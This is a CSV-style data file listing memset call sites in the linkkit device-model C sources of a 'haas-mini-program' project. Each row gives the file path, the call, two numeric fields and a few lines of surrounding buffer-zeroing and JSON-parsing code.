2021\haas-mini-program\components\linkkit\dev_model\dm_message.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_message.c,"memset(temp_id, 0, DM_UTILS_UINT32_STRLEN);",120,1,"        message_len = 0;
        message = NULL;
        memset(temp_id, 0, DM_UTILS_UINT32_STRLEN);
        memset(product_key, 0, IOTX_PRODUCT_KEY_LEN + 1);
        memset(device_name, 0, IOTX_DEVICE_NAME_LEN + 1);
"
2021\haas-mini-program\components\linkkit\dev_model\dm_message.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_message.c,"memset(&lite_item_ds, 0, sizeof(lite_cjson_t));",120,1,"        memset(&lite_item_pk, 0, sizeof(lite_cjson_t));
        memset(&lite_item_dn, 0, sizeof(lite_cjson_t));
        memset(&lite_item_ds, 0, sizeof(lite_cjson_t));

        /* Item */
"
2021\haas-mini-program\components\linkkit\dev_model\dm_message.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_message.c,"memset(&lite_item_ed, 0, sizeof(lite_cjson_t));",120,1,"        memset(&lite_item_pk, 0, sizeof(lite_cjson_t));
        memset(&lite_item_dn, 0, sizeof(lite_cjson_t));
        memset(&lite_item_ed, 0, sizeof(lite_cjson_t));
        memset(&lite_item_code, 0, sizeof(lite_cjson_t));

"
2021\haas-mini-program\components\linkkit\dev_model\dm_message.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_message.c,"memset(&lite_item_code, 0, sizeof(lite_cjson_t));",120,1,"        memset(&lite_item_dn, 0, sizeof(lite_cjson_t));
        memset(&lite_item_ed, 0, sizeof(lite_cjson_t));
        memset(&lite_item_code, 0, sizeof(lite_cjson_t));

        /* Item */
"
2021\haas-mini-program\components\linkkit\dev_model\dm_message.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_message.c,"memset(device_secret, 0, IOTX_DEVICE_SECRET_LEN + 1);",120,1,"        memset(product_key, 0, IOTX_PRODUCT_KEY_LEN + 1);
        memset(device_name, 0, IOTX_DEVICE_NAME_LEN + 1);
        memset(device_secret, 0, IOTX_DEVICE_SECRET_LEN + 1);

        res = dm_mgr_get_devid_by_index(index, &search_devid);
"
2021\haas-mini-program\components\linkkit\dev_model\dm_message.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_message.c,"memset(*payload, 0, *payload_len);",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(*payload, 0, *payload_len);
    amp_snprintf(*payload, *payload_len, DM_MSG_DEV_CORE_SERVICE_DEV, ip_addr, port, device_array);
    DM_free(device_array);
"
2021\haas-mini-program\components\linkkit\dev_model\dm_message.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_message.c,"memset(params, 0, params_len);",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(params, 0, params_len);
    amp_snprintf(params, params_len, DM_MSG_THING_SUB_REGISTER_PARAMS, product_key, device_name);

"
2021\haas-mini-program\components\linkkit\dev_model\dm_message.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_message.c,"memset(sign_source, 0, sign_source_len);",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(sign_source, 0, sign_source_len);
    amp_snprintf(sign_source, sign_source_len, DM_MSG_THING_PROXY_PRODUCT_REGISTER_SIGN_SOURCE,
                 device_name, product_key, random);
"
2021\haas-mini-program\components\linkkit\dev_model\dm_message.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_message.c,"memset(new_key, 0, new_key_len);",120,1,"            return STATE_SYS_DEPEND_MALLOC;
        }
        memset(new_key, 0, new_key_len);
        if (key) {
            memcpy(new_key, key, strlen(key));
"
2021\haas-mini-program\components\linkkit\dev_model\dm_message.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_message.c,"memset(&lite_item_key, 0, sizeof(lite_cjson_t));",120,1,"
    for (index = 0; index < lite.size; index++) {
        memset(&lite_item_key, 0, sizeof(lite_cjson_t));
        memset(&lite_item_value, 0, sizeof(lite_cjson_t));

"
2021\haas-mini-program\components\linkkit\dev_model\dm_message.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_message.c,"memset(&lite_item_value, 0, sizeof(lite_cjson_t));",120,1,"    for (index = 0; index < lite.size; index++) {
        memset(&lite_item_key, 0, sizeof(lite_cjson_t));
        memset(&lite_item_value, 0, sizeof(lite_cjson_t));

        res = lite_cjson_object_item_by_index(&lite, index, &lite_item_key, &lite_item_value);
"
2021\haas-mini-program\components\linkkit\dev_model\dm_message.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_message.c,"memset(key, 0, identifier_len + 1);",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(key, 0, identifier_len + 1);
    memcpy(key, identifier, identifier_len);

"
2021\haas-mini-program\components\linkkit\dev_model\dm_message_cache.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_message_cache.c,"memset(ctx, 0, sizeof(dm_msg_cache_ctx_t));",120,1,"    dm_msg_cache_ctx_t *ctx = _dm_msg_cache_get_ctx();

    memset(ctx, 0, sizeof(dm_msg_cache_ctx_t));

    /* Create Mutex */
"
2021\haas-mini-program\components\linkkit\dev_model\dm_message_cache.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_message_cache.c,"memset(node, 0, sizeof(dm_msg_cache_node_t));",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(node, 0, sizeof(dm_msg_cache_node_t));

    node->msgid = msgid;
"
2021\haas-mini-program\components\linkkit\dev_model\dm_msg_process.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_msg_process.c,"memset(*data, 0, strlen(""{}"") + 1);",120,1,"            return STATE_SYS_DEPEND_MALLOC;
        }
        memset(*data, 0, strlen(""{}"") + 1);
        memcpy(*data, ""{}"", strlen(""{}""));

"
2021\haas-mini-program\components\linkkit\dev_model\dm_msg_process.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_msg_process.c,"memset(&response, 0, sizeof(dm_msg_response_payload_t));",120,1,"    iotx_state_event(ITE_STATE_DEV_MODEL, STATE_DEV_MODEL_RX_CLOUD_MESSAGE, DM_URI_THING_SUB_REGISTER_REPLY);

    memset(&response, 0, sizeof(dm_msg_response_payload_t));

    /* Response */
"
2021\haas-mini-program\components\linkkit\dev_model\dm_ota.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_ota.c,"memset(ctx, 0, sizeof(dm_ota_ctx_t));",120,1,"{
    dm_ota_ctx_t *ctx = _dm_ota_get_ctx();
    memset(ctx, 0, sizeof(dm_ota_ctx_t));

    IOT_Ioctl(IOTX_IOCTL_GET_PRODUCT_KEY, ctx->product_key);
"
2021\haas-mini-program\components\linkkit\dev_model\dm_server.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_server.c,"memset(alcs_context, 0, sizeof(dm_server_alcs_context_t));",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(alcs_context, 0, sizeof(dm_server_alcs_context_t));

    alcs_context->ip = DM_malloc(strlen((char *)remote->addr) + 1);
"
2021\haas-mini-program\components\linkkit\dev_model\dm_server.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_server.c,"memset(alcs_context->ip, 0, strlen((char *)remote->addr) + 1);",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(alcs_context->ip, 0, strlen((char *)remote->addr) + 1);
    memcpy(alcs_context->ip, (char *)remote->addr, strlen((char *)remote->addr) + 1);

"
2021\haas-mini-program\components\linkkit\dev_model\dm_server.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_server.c,"memset(alcs_context->token, 0, message->header.tokenlen);",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(alcs_context->token, 0, message->header.tokenlen);
    memcpy(alcs_context->token, message->token, message->header.tokenlen);

"
2021\haas-mini-program\components\linkkit\dev_model\dm_server_adapter.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_server_adapter.c,"memset(&notify_sa, 0, sizeof(notify_sa));",120,1,"                 DM_MSG_VERSION, data_len, data, ALCS_NOTIFY_METHOD);

    memset(&notify_sa, 0, sizeof(notify_sa));
    memcpy(notify_sa.addr, ALCS_NOTIFY_HOST, strlen(ALCS_NOTIFY_HOST));
    notify_sa.port = ALCS_NOTIFY_PORT;
"
2021\haas-mini-program\components\linkkit\dev_model\dm_server_adapter.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_server_adapter.c,"memset(&alcs_param, 0x0, sizeof(iotx_alcs_param_t));",120,1,"    iotx_alcs_event_handle_t event_handle;

    memset(&alcs_param, 0x0, sizeof(iotx_alcs_param_t));
    memset(&event_handle, 0x0, sizeof(iotx_alcs_event_handle_t));

"
2021\haas-mini-program\components\linkkit\dev_model\dm_server_adapter.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_server_adapter.c,"memset(&event_handle, 0x0, sizeof(iotx_alcs_event_handle_t));",120,1,"
    memset(&alcs_param, 0x0, sizeof(iotx_alcs_param_t));
    memset(&event_handle, 0x0, sizeof(iotx_alcs_event_handle_t));

    alcs_param.group = (char *)DM_SERVER_ALCS_ADDR;
"
2021\haas-mini-program\components\linkkit\dev_model\dm_server_adapter.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_server_adapter.c,"memset(&alcs_msg, 0, sizeof(iotx_alcs_msg_t));",120,1,"    dm_server_alcs_context_t *alcs_context = (dm_server_alcs_context_t *)context;

    memset(&alcs_msg, 0, sizeof(iotx_alcs_msg_t));

    alcs_msg.group_id = 0;
"
2021\haas-mini-program\components\linkkit\dev_model\dm_server_adapter.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_server_adapter.c,"memset(&alcs_res, 0, sizeof(iotx_alcs_res_t));",120,1,"    iotx_alcs_res_t alcs_res;

    memset(&alcs_res, 0, sizeof(iotx_alcs_res_t));

    alcs_res.uri = uri;
"
2021\haas-mini-program\components\linkkit\dev_model\dm_shadow.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_shadow.c,"memset(*method, 0, service_method_len);",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(*method, 0, service_method_len);
    amp_snprintf(*method, service_method_len, service_method_fmt, service_item->identifier);

"
2021\haas-mini-program\components\linkkit\dev_model\dm_shadow.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_shadow.c,"memset(*method, 0, event_method_len);",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(*method, 0, event_method_len);
    amp_snprintf(*method, event_method_len, event_method_fmt, identifier);

"
2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,"memset(complex_array->value, 0, (complex_array->size) * (sizeof(int)));",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(complex_array->value, 0, (complex_array->size) * (sizeof(int)));

    /* Just For Test */
"
2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,"memset(complex_array->value, 0, (complex_array->size) * (sizeof(float)));",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(complex_array->value, 0, (complex_array->size) * (sizeof(float)));

    /* Just For Test */
"
2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,"memset(complex_array->value, 0, (complex_array->size) * (sizeof(double)));",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(complex_array->value, 0, (complex_array->size) * (sizeof(double)));

    /* Just For Test */
"
2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,"memset(complex_array->value, 0, (complex_array->size) * (sizeof(char *)));",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(complex_array->value, 0, (complex_array->size) * (sizeof(char *)));

#ifdef IOTX_DM_TSL_DEVELOP_TEST
"
2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,"memset(temp, 0, sizeof(temp));",120,1,"    char temp[10] = {0};
    for (index = 0; index < complex_array->size; index++) {
        memset(temp, 0, sizeof(temp));
        amp_snprintf(temp, sizeof(temp), ""%d"", index + 1);
        *((char **)(complex_array->value) + index) = DM_malloc(strlen(temp) + 1);
"
2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,"memset(*((char **)(complex_array->value) + index), 0, strlen(temp) + 1);",120,1,"        *((char **)(complex_array->value) + index) = DM_malloc(strlen(temp) + 1);
        if (*((char **)(complex_array->value) + index) != NULL) {
            memset(*((char **)(complex_array->value) + index), 0, strlen(temp) + 1);
            memcpy(*((char **)(complex_array->value) + index), temp, strlen(temp));
        }
"
2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,"memset(data_value_next_level, 0, sizeof(dm_shw_data_value_t));",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(data_value_next_level, 0, sizeof(dm_shw_data_value_t));
    data_value_next_level->type = DM_SHW_DATA_TYPE_ARRAY;

"
2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,"memset(complex_array_next_level, 0, sizeof(dm_shw_data_value_complex_t));",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(complex_array_next_level, 0, sizeof(dm_shw_data_value_complex_t));
    complex_array->value = (void *)data_value_next_level;
    data_value_next_level->value = complex_array_next_level;
"
2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,"memset(&lite_type, 0, sizeof(lite_cjson_t));",120,1,"        return DM_JSON_PARSE_FAILED;
    }
    memset(&lite_type, 0, sizeof(lite_cjson_t));
    res = lite_cjson_object_item(&lite_item, DM_SHW_KEY_TYPE, strlen(DM_SHW_KEY_TYPE), &lite_type);
    if (res != SUCCESS_RETURN && !lite_cjson_is_string(&lite_type)) {
"
2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,"memset(&lite_specs, 0, sizeof(lite_cjson_t));",120,1,"
    /* Parse Specs (Optional) */
    memset(&lite_specs, 0, sizeof(lite_cjson_t));
    res = lite_cjson_object_item(&lite_item, DM_SHW_KEY_SPECS, strlen(DM_SHW_KEY_SPECS), &lite_specs);
    if ((complex_array_next_level->type == DM_SHW_DATA_TYPE_ARRAY
"
2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,"memset(complex_array->value, 0, (complex_array->size) * (sizeof(dm_shw_data_t)));",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(complex_array->value, 0, (complex_array->size) * (sizeof(dm_shw_data_t)));

    dm_log_debug(""Array Struct Spec Size: %d"", root->size);
"
2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,"memset(complex_array, 0, sizeof(dm_shw_data_value_complex_t));",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(complex_array, 0, sizeof(dm_shw_data_value_complex_t));
    data_value->value = (void *)complex_array;

"
2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,"memset(complex_struct, 0, sizeof(dm_shw_data_value_complex_t));",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(complex_struct, 0, sizeof(dm_shw_data_value_complex_t));
    data_value->value = (void *)complex_struct;

"
2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,"memset(complex_struct->value, 0, (complex_struct->size) * (sizeof(dm_shw_data_t)));",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(complex_struct->value, 0, (complex_struct->size) * (sizeof(dm_shw_data_t)));

    for (index = 0; index < complex_struct->size; index++) {
"
2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,"memset(data_value, 0, sizeof(dm_shw_data_value_t));",120,1,"    lite_cjson_t lite_item;

    memset(data_value, 0, sizeof(dm_shw_data_value_t));

    /* Parse Type */
"
2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,"memset(&lite_properties, 0, sizeof(lite_cjson_t));",120,1,"    lite_cjson_t lite_properties, lite_property;

    memset(&lite_properties, 0, sizeof(lite_cjson_t));
    res = lite_cjson_object_item(root, DM_SHW_KEY_PROPERTIES, strlen(DM_SHW_KEY_PROPERTIES), &lite_properties);
    if (res == SUCCESS_RETURN) {
"
2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,"memset(shadow->properties, 0, sizeof(dm_shw_data_t) * (lite_properties.size));",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(shadow->properties, 0, sizeof(dm_shw_data_t) * (lite_properties.size));

    for (index = 0; index < lite_properties.size; index++) {
"
2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,"memset(&lite_property, 0, sizeof(lite_cjson_t));",120,1,"
    for (index = 0; index < lite_properties.size; index++) {
        memset(&lite_property, 0, sizeof(lite_cjson_t));
        res = lite_cjson_array_item(&lite_properties, index, &lite_property);
        if (res != SUCCESS_RETURN || !lite_cjson_is_object(&lite_property)) {
"
2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,"memset(event->output_datas, 0, (event->output_data_number) * (sizeof(dm_shw_data_t)));",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(event->output_datas, 0, (event->output_data_number) * (sizeof(dm_shw_data_t)));

    for (index = 0; index < event->output_data_number; index++) {
"
2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,"memset(&lite_events, 0, sizeof(lite_cjson_t));",120,1,"    lite_cjson_t lite_events, lite_event;

    memset(&lite_events, 0, sizeof(lite_cjson_t));
    res = lite_cjson_object_item(root, DM_SHW_KEY_EVENTS, strlen(DM_SHW_KEY_EVENTS), &lite_events);
    if (res == SUCCESS_RETURN) {
"
2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,"memset(shadow->events, 0, sizeof(dm_shw_event_t) * (lite_events.size));",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(shadow->events, 0, sizeof(dm_shw_event_t) * (lite_events.size));

    for (index = 0; index < lite_events.size; index++) {
"
2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,"memset(&lite_event, 0, sizeof(lite_cjson_t));",120,1,"
    for (index = 0; index < lite_events.size; index++) {
        memset(&lite_event, 0, sizeof(lite_cjson_t));
        res = lite_cjson_array_item(&lite_events, index, &lite_event);
        if (res != SUCCESS_RETURN || !lite_cjson_is_object(&lite_event)) {
"
2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,"memset(service->output_datas, 0, (service->output_data_number) * (sizeof(dm_shw_data_t)));",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(service->output_datas, 0, (service->output_data_number) * (sizeof(dm_shw_data_t)));

    for (index = 0; index < service->output_data_number; index++) {
"
2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,"memset(service->input_datas, 0, (service->input_data_number) * (sizeof(dm_shw_data_t)));",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(service->input_datas, 0, (service->input_data_number) * (sizeof(dm_shw_data_t)));

    for (index = 0; index < service->input_data_number; index++) {
"
2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,"memset(&lite_services, 0, sizeof(lite_cjson_t));",120,1,"    dm_shw_service_t *service = NULL;

    memset(&lite_services, 0, sizeof(lite_cjson_t));
    res = lite_cjson_object_item(root, DM_SHW_KEY_SERVICES, strlen(DM_SHW_KEY_SERVICES), &lite_services);
    if (res == SUCCESS_RETURN) {
"
2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,"memset(shadow->services, 0, sizeof(dm_shw_service_t) * (lite_services.size));",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(shadow->services, 0, sizeof(dm_shw_service_t) * (lite_services.size));

    for (index = 0; index < lite_services.size; index++) {
"
2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,"memset(&lite_service, 0, sizeof(lite_cjson_t));",120,1,"
    for (index = 0; index < lite_services.size; index++) {
        memset(&lite_service, 0, sizeof(lite_cjson_t));
        service = shadow->services + index;

"
2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,"memset(*shadow, 0, sizeof(dm_shw_t));",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(*shadow, 0, sizeof(dm_shw_t));

    /* Parse Root */
"
2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_tsl_alink.c,"memset(&lite_root, 0, sizeof(lite_root));",120,1,"
    /* Parse Root */
    memset(&lite_root, 0, sizeof(lite_root));
    res = lite_cjson_parse(tsl, tsl_len, &lite_root);
    if (res != SUCCESS_RETURN || !lite_cjson_is_object(&lite_root)) {
"
2021\haas-mini-program\components\linkkit\dev_model\dm_utils.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_utils.c,"memset(*output, 0, output_len);",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(*output, 0, output_len);
    memcpy(*output, input, input_len);

"
2021\haas-mini-program\components\linkkit\dev_model\dm_utils.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_utils.c,"memset(*output, 0, strlen(temp_output) + 1);",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(*output, 0, strlen(temp_output) + 1);
    memcpy(*output, temp_output, strlen(temp_output));

"
2021\haas-mini-program\components\linkkit\dev_model\dm_utils.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_utils.c,"memset(*output, 0, output_len + 1);",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(*output, 0, output_len + 1);

    for (index = 0; index < input_len; index++) {
"
2021\haas-mini-program\components\linkkit\dev_model\dm_utils.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_utils.c,"memset(*output, 0, *output_len);",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(*output, 0, *output_len);

    for (index = 0; index < input_len; index += 2) {
"
2021\haas-mini-program\components\linkkit\dev_model\dm_utils.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_utils.c,"memset(*service_name, 0, service_name_len);",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(*service_name, 0, service_name_len);

    if (prefix != NULL) {
"
2021\haas-mini-program\components\linkkit\dev_model\dm_utils.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_utils.c,"memset(*new_uri, 0, new_uri_len);",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(*new_uri, 0, new_uri_len);
    
    memcpy(*new_uri, prefix, strlen(prefix));
"
2021\haas-mini-program\components\linkkit\dev_model\dm_utils.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_utils.c,"memset(lite, 0, sizeof(lite_cjson_t));",120,1,"        return STATE_USER_INPUT_INVALID;
    }
    memset(lite, 0, sizeof(lite_cjson_t));

    res = lite_cjson_parse(payload, payload_len, lite);
"
2021\haas-mini-program\components\linkkit\dev_model\dm_utils.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_utils.c,"memset(lite_item, 0, sizeof(lite_cjson_t));",120,1,"    }

    memset(lite_item, 0, sizeof(lite_cjson_t));

    res = lite_cjson_object_item(lite, key, key_len, lite_item);
"
2021\haas-mini-program\components\linkkit\dev_model\impl_gateway.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\impl_gateway.c,"memset(node, 0, sizeof(linkkit_gateway_dev_callback_node_t));",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(node, 0, sizeof(linkkit_gateway_dev_callback_node_t));
    node->devid = devid;
    node->callback = callback;
"
2021\haas-mini-program\components\linkkit\dev_model\impl_gateway.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\impl_gateway.c,"memset(search_node, 0, sizeof(linkkit_gateway_upstream_sync_callback_node_t));",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(search_node, 0, sizeof(linkkit_gateway_upstream_sync_callback_node_t));
    search_node->msgid = msgid;
    search_node->semaphore = semaphore;
"
2021\haas-mini-program\components\linkkit\dev_model\impl_gateway.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\impl_gateway.c,"memset(node, 0, sizeof(linkkit_gateway_upstream_async_callback_node_t));",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(node, 0, sizeof(linkkit_gateway_upstream_async_callback_node_t));
    node->msgid = msgid;
    node->timeout_ms = timeout_ms;
"
2021\haas-mini-program\components\linkkit\dev_model\impl_gateway.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\impl_gateway.c,"memset(&event, 0, sizeof(linkkit_event_t));",120,1,"                linkkit_event_t event;

                memset(&event, 0, sizeof(linkkit_event_t));
                event.event_type = LINKKIT_EVENT_CLOUD_CONNECTED;
                linkkit_gateway_ctx->init_params.event_cb(&event, linkkit_gateway_ctx->init_params.ctx);
"
2021\haas-mini-program\components\linkkit\dev_model\impl_gateway.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\impl_gateway.c,"memset(&lite_item_id, 0, sizeof(lite_cjson_t));",120,1,"
            /* Parse Id */
            memset(&lite_item_id, 0, sizeof(lite_cjson_t));
            res = lite_cjson_object_item(&lite, LINKKIT_GATEWAY_LEGACY_KEY_ID, strlen(LINKKIT_GATEWAY_LEGACY_KEY_ID),
                                         &lite_item_id);
"
2021\haas-mini-program\components\linkkit\dev_model\impl_gateway.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\impl_gateway.c,"memset(&lite_item_devid, 0, sizeof(lite_cjson_t));",120,1,"
            /* Parse Devid */
            memset(&lite_item_devid, 0, sizeof(lite_cjson_t));
            res = lite_cjson_object_item(&lite, LINKKIT_GATEWAY_LEGACY_KEY_DEVID, strlen(LINKKIT_GATEWAY_LEGACY_KEY_DEVID),
                                         &lite_item_devid);
"
2021\haas-mini-program\components\linkkit\dev_model\impl_gateway.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\impl_gateway.c,"memset(&lite_item_payload, 0, sizeof(lite_cjson_t));",120,1,"
            /* Parse Payload */
